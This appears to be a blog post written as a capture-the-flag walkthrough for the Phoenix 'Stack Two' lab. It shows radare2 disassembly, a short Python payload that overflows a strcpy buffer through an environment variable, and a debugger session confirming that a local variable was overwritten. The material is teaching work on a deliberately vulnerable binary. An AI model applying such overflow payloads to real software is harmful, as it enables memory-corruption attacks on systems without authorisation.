@@ -1,0 +1,287 @@
+---
+layout: post
+title:  "Phoenix x86 Stack Two"
+date: "2019-10-12 10:00:00 +0300"
+categories: exploit-education phoenix x86
+---
+
+Stack Two is the continuation of the stack-based buffer overflow challenges.
+
+Once more, `rabin2` is used to get some information about the binary.
+
+{% highlight shell %}
+$ rabin2 -I /opt/phoenix/i486/stack-two 
+arch     x86
+baddr    0x8048000
+binsz    3750
+bintype  elf
+bits     32
+canary   false
+class    ELF32
+compiler GCC: (GNU) 7.3.0
+crypto   false
+endian   little
+havecode true
+intrp    /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  Intel 80386
+maxopsz  16
+minopsz  1
+nx       false
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    no
+rpath    /opt/phoenix/i486-linux-musl/lib
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+{% endhighlight %}
+
+Of the important info above, everything is the same as the previous levels. The binary is a 32-bit Linux ELF with no protection against stack overflow.
+
+{% highlight shell %}
+$ r2 /opt/phoenix/i486/stack-two
+{% endhighlight %}
+
+{%highlight nasm %}
+[0x080483b0]> aas
+Cannot analyze at 0x08048630
+[0x080483b0]> afl
+0x0804831c    1 17           sym._init
+0x08048500    7 277  -> 112  sym.frame_dummy
+0x080485f0    5 49           sym.__do_global_ctors_aux
+0x08048621    1 12           sym._fini
+0x08048480    8 113  -> 111  sym.__do_global_dtors_aux
+0x08048114   49 556  -> 650  sym..interp
+0x080483b0    1 62           entry0
+0x080483a0    1 6            sym.imp.__libc_start_main
+0x08048744    1 14           loc.__GNU_EH_FRAME_HDR
+0x08048760    3 34           sym..eh_frame
+0x0804879c    1 41           obj.__EH_FRAME_BEGIN
+0x080483f0    4 49   -> 40   sym.deregister_tm_clones
+0x08048545    6 156          main
+0x08048370    1 6            sym.imp.puts
+0x08048360    1 6            sym.imp.getenv
+0x08048380    1 6            sym.imp.errx
+0x08048340    1 6            sym.imp.strcpy
+0x08048350    1 6            sym.imp.printf
+0x08048390    1 6            sym.imp.exit
+[0x080483b0]> s main
+[0x08048545]> pdf
+/ (fcn) main 156
+|   int main (int argc, char **argv, char **envp);
+|           ; var int32_t var_50h @ ebp-0x50
+|           ; var int32_t var_10h @ ebp-0x10
+|           ; var int32_t var_ch @ ebp-0xc
+|           ; arg int32_t arg_4h @ esp+0x4
+|           ; DATA XREF from entry0 @ 0x80483e4
+|           0x08048545      8d4c2404       lea ecx, [arg_4h]
+|           0x08048549      83e4f0         and esp, 0xfffffff0
+|           0x0804854c      ff71fc         push dword [ecx - 4]
+|           0x0804854f      55             push ebp
+|           0x08048550      89e5           mov ebp, esp
+|           0x08048552      51             push ecx
+|           0x08048553      83ec54         sub esp, 0x54
+|           0x08048556      83ec0c         sub esp, 0xc
+|           0x08048559      6830860408     push str.Welcome_to_phoenix_stack_two__brought_to_you_by_https:__exploit.education ; sym..rodata
+|                                                                      ; 0x8048630 ; "Welcome to phoenix/stack-two, brought to you by https://exploit.education"
+|           0x0804855e      e80dfeffff     call sym.imp.puts           ; int puts(const char *s)
+|           0x08048563      83c410         add esp, 0x10
+|           0x08048566      83ec0c         sub esp, 0xc
+|           0x08048569      687a860408     push str.ExploitEducation   ; 0x804867a ; "ExploitEducation"
+|           0x0804856e      e8edfdffff     call sym.imp.getenv         ; char *getenv(const char *name)
+|           0x08048573      83c410         add esp, 0x10
+|           0x08048576      8945f4         mov dword [var_ch], eax
+|           0x08048579      837df400       cmp dword [var_ch], 0
+|       ,=< 0x0804857d      750f           jne 0x804858e
+|       |   0x0804857f      83ec08         sub esp, 8
+|       |   0x08048582      688c860408     push str.please_set_the_ExploitEducation_environment_variable ; 0x804868c ; "please set the ExploitEducation environment variable"
+|       |   0x08048587      6a01           push 1                      ; 1
+|       |   0x08048589      e8f2fdffff     call sym.imp.errx           ; void errx(int eval)
+|       `-> 0x0804858e      c745f0000000.  mov dword [var_10h], 0
+|           0x08048595      83ec08         sub esp, 8
+|           0x08048598      ff75f4         push dword [var_ch]
+|           0x0804859b      8d45b0         lea eax, [var_50h]
+|           0x0804859e      50             push eax
+|           0x0804859f      e89cfdffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
+|           0x080485a4      83c410         add esp, 0x10
+|           0x080485a7      8b45f0         mov eax, dword [var_10h]
+|           0x080485aa      3d0a090a0d     cmp eax, 0xd0a090a
+|       ,=< 0x080485af      7512           jne 0x80485c3
+|       |   0x080485b1      83ec0c         sub esp, 0xc
+|       |   0x080485b4      68c4860408     push str.Well_done__you_have_successfully_set_changeme_to_the_correct_value ; 0x80486c4 ; "Well done, you have successfully set changeme to the correct value"
+|       |   0x080485b9      e8b2fdffff     call sym.imp.puts           ; int puts(const char *s)
+|       |   0x080485be      83c410         add esp, 0x10
+|      ,==< 0x080485c1      eb14           jmp 0x80485d7
+|      |`-> 0x080485c3      8b45f0         mov eax, dword [var_10h]
+|      |    0x080485c6      83ec08         sub esp, 8
+|      |    0x080485c9      50             push eax
+|      |    0x080485ca      6808870408     push str.Almost__changeme_is_currently_0x_08x__we_want_0x0d0a090a ; 0x8048708 ; "Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n"
+|      |    0x080485cf      e87cfdffff     call sym.imp.printf         ; int printf(const char *format)
+|      |    0x080485d4      83c410         add esp, 0x10
+|      |    ; CODE XREF from main @ 0x80485c1
+|      `--> 0x080485d7      83ec0c         sub esp, 0xc
+|           0x080485da      6a00           push 0
+\           0x080485dc      e8affdffff     call sym.imp.exit           ; void exit(int status)
+[0x08048545]> agf
+[0x08048545]>  # int main (int argc, char **argv, char **envp);
+                    .---------------------------------------------------------------------------------------.
+                    |  0x8048545                                                                            |
+                    | (fcn) main 156                                                                        |
+                    |   int main (int argc, char **argv, char **envp);                                      |
+                    | ; var int32_t var_50h @ ebp-0x50                                                      |
+                    | ; var int32_t var_10h @ ebp-0x10                                                      |
+                    | ; var int32_t var_ch @ ebp-0xc                                                        |
+                    | ; arg int32_t arg_4h @ esp+0x4                                                        |
+                    | ; DATA XREF from entry0 @ 0x80483e4                                                   |
+                    | lea ecx, [arg_4h]                                                                     |
+                    | and esp, 0xfffffff0                                                                   |
+                    | push dword [ecx - 4]                                                                  |
+                    | push ebp                                                                              |
+                    | mov ebp, esp                                                                          |
+                    | push ecx                                                                              |
+                    | sub esp, 0x54                                                                         |
+                    | sub esp, 0xc                                                                          |
+                    | ; sym..rodata                                                                         |
+                    | ; 0x8048630                                                                           |
+                    | ; "Welcome to phoenix/stack-two, brought to you by https://exploit.education"         |
+                    | push str.Welcome_to_phoenix_stack_two__brought_to_you_by_https:__exploit.education    |
+                    | ; int puts(const char *s)                                                             |
+                    | call sym.imp.puts;[oa]                                                                |
+                    | add esp, 0x10                                                                         |
+                    | sub esp, 0xc                                                                          |
+                    | ; 0x804867a                                                                           |
+                    | ; "ExploitEducation"                                                                  |
+                    | push str.ExploitEducation                                                             |
+                    | ; char *getenv(const char *name)                                                      |
+                    | call sym.imp.getenv;[ob]                                                              |
+                    | add esp, 0x10                                                                         |
+                    | mov dword [var_ch], eax                                                               |
+                    | cmp dword [var_ch], 0                                                                 |
+                    | jne 0x804858e                                                                         |
+                    `---------------------------------------------------------------------------------------'
+                            f t
+                            | |
+                            | '---------------------------------------------.
+    .-----------------------'                                               |
+    |                                                                       |
+.------------------------------------------------------------------.    .---------------------------------------------.
+|  0x804857f                                                       |    |  0x804858e                                  |
+| sub esp, 8                                                       |    | mov dword [var_10h], 0                      |
+| ; 0x804868c                                                      |    | sub esp, 8                                  |
+| ; "please set the ExploitEducation environment variable"         |    | push dword [var_ch]                         |
+| push str.please_set_the_ExploitEducation_environment_variable    |    | lea eax, [var_50h]                          |
+| ; 1                                                              |    | push eax                                    |
+| push 1                                                           |    | ; char *strcpy(char *dest, const char *src) |
+| ; void errx(int eval)                                            |    | call sym.imp.strcpy;[od]                    |
+| call sym.imp.errx;[oc]                                           |    | add esp, 0x10                               |
+`------------------------------------------------------------------'    | mov eax, dword [var_10h]                    |
+                                                                        | cmp eax, 0xd0a090a                          |
+                                                                        | jne 0x80485c3                               |
+                                                                        `---------------------------------------------'
+                                                                                f t
+                                                                                | |
+                                                                                | '---------------------.
+                  .-------------------------------------------------------------'                       |
+                  |                                                                                     |
+              .--------------------------------------------------------------------------------.    .----------------------------------------------------------------------.
+              |  0x80485b1                                                                     |    |  0x80485c3                                                           |
+              | sub esp, 0xc                                                                   |    | mov eax, dword [var_10h]                                             |
+              | ; 0x80486c4                                                                    |    | sub esp, 8                                                           |
+              | ; "Well done, you have successfully set changeme to the correct value"         |    | push eax                                                             |
+              | push str.Well_done__you_have_successfully_set_changeme_to_the_correct_value    |    | ; 0x8048708                                                          |
+              | ; int puts(const char *s)                                                      |    | ; "Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n"       |
+              | call sym.imp.puts;[oa]                                                         |    | push str.Almost__changeme_is_currently_0x_08x__we_want_0x0d0a090a    |
+              | add esp, 0x10                                                                  |    | ; int printf(const char *format)                                     |
+              | jmp 0x80485d7                                                                  |    | call sym.imp.printf;[oe]                                             |
+              `--------------------------------------------------------------------------------'    | add esp, 0x10                                                        |
+                  v                                                                                 `----------------------------------------------------------------------'
+                  |                                                                                     v
+                  |                                                                                     |
+                  '----------------------------------------------------------------.                    |
+                                                                                   | .------------------'
+                                                                                   | |
+                                                                             .-----------------------------------.
+                                                                             |  0x80485d7                        |
+                                                                             | ; CODE XREF from main @ 0x80485c1 |
+                                                                             | sub esp, 0xc                      |
+                                                                             | push 0                            |
+                                                                             | ; void exit(int status)           |
+                                                                             | call sym.imp.exit;[of]            |
+                                                                             `-----------------------------------'
+{% endhighlight %}
+
+What differs from the previous level is the fact that the input is read via an environment variable. The objective remains the same, which is to overwrite a local variable, `var_10h`. This is feasible because there is a call to `strcpy` that copies the contents of the environment variable `ExploitEducation` to the buffer `var_50h`.
+
+The value that needs to be put in `var_10h` is `0xd0a090a`.
+
+Here follows a `python3` script to create the exploit:
+
+{% highlight python %}
+#!/usr/bin/env python3
+print("X"*64+"\x0a\x09\x0a\x0d")
+{% endhighlight %}
+
+{% highlight shell %}
+$ ./myScript.py > pattern
+$ export ExploitEducation=`cat pattern`
+{% endhighlight %}
+
+Now the binary can be debugged.
+
+{% highlight shell %}
+$ r2 -d /opt/phoenix/i486/stack-two
+{% endhighlight %}
+
+{% highlight nasm %}
+[0xf7ed0d4b]> aas
+Cannot analyze at 0x08048630
+[0xf7ed0d4b]> db 0x0804859f
+[0xf7ed0d4b]> dc
+Welcome to phoenix/stack-two, brought to you by https://exploit.education
+hit breakpoint at: 804859f
+[0x0804859f]> dr
+eax = 0xffba6fb8
+ebx = 0xf7f06000
+ecx = 0x0000006e
+edx = 0x00000010
+esi = 0xffba7094
+edi = 0x00000001
+esp = 0xffba6fa0
+ebp = 0xffba7008
+eip = 0x0804859f
+eflags = 0x00000292
+oeax = 0xffffffff
+[0x0804859f]> px/24xw 0xffba6fa0
+0xffba6fa0  0xffba6fb8 0xffba7caf 0x00000084 0x00000010  .o...|..........
+0xffba6fb0  0x0804831c 0x08048621 0x00000000 0x00000063  ....!.......c...
+0xffba6fc0  0x00000000 0x00000000 0x00000000 0x00000000  ................
+0xffba6fd0  0x00000011 0xf7f0819c 0x00000000 0x080482e4  ................
+0xffba6fe0  0x00000000 0x00000000 0x00000000 0x00000000  ................
+0xffba6ff0  0x00000000 0x00000000 0x00000000 0xffba7caf  .............|..
+[0x0804859f]> px/xw 0xffba7008-0x10
+0xffba6ff8  0x00000000                                   ....
+[0x0804859f]> dso
+hit breakpoint at: 80485a4
+[0x0804859f]> px/24xw 0xffba6fa0
+0xffba6fa0  0xffba6fb8 0xffba7caf 0x00000084 0x00000010  .o...|..........
+0xffba6fb0  0x0804831c 0x08048621 0x58585858 0x58585858  ....!...XXXXXXXX
+0xffba6fc0  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
+0xffba6fd0  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
+0xffba6fe0  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
+0xffba6ff0  0x58585858 0x58585858 0x0d0a090a 0xffba7c00  XXXXXXXX.....|..
+[0x0804859f]> px/xw 0xffba7008-0x10
+0xffba6ff8  0x0d0a090a                                   ....
+[0x0804859f]> dc
+Well done, you have successfully set changeme to the correct value
+{% endhighlight %}
+
+## Conclusion
+This level is almost identical to the previous one, with one little difference. That is, the input needs to be passed through an environment variable and not as an argument.
